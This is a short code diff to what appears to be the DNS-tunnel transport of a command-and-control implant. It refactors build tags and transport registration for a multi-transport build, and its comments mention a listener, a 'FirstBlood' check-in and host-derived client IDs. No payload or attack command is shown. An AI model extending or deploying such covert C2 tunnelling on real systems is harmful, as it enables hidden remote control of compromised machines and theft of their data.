@@ -1,4 +1,4 @@
-//go:build transport_dns
+//go:build transport_dns || transport_multi
 
 package main
 
@@ -19,8 +19,6 @@ import (
 	"github.com/miekg/dns"
 )
 
-// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
-const listenerType = "dns"
 
 // DNSClient 实现 communication.Transport（DNS 隧道轮询模型）。
 // config.Host = "DNSServer:53:tunnel.domain"（冒号分隔，与 listener 的 OSS 格式一致）。
@@ -37,7 +35,13 @@ type DNSClient struct {
 
 // NewTransport 构造 DNS 传输（单二进制 build tag 入口）。
 // clientID 与服务端一致：MD5(MetaInfo 明文)（原 main 由 app.Init 返回值传入，此处直接派生）。
-func NewTransport() transportClient {
+// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
+func init() {
+	registerTransport("dns", newDNSTransport)
+	listenerType = "dns"
+}
+
+func newDNSTransport() transportClient {
 	cid, _ := utils.GetMetaInfoClientID()
 	return &DNSClient{clientID: cid, reconnectMgr: reconnect.NewReconnectManager()}
 }
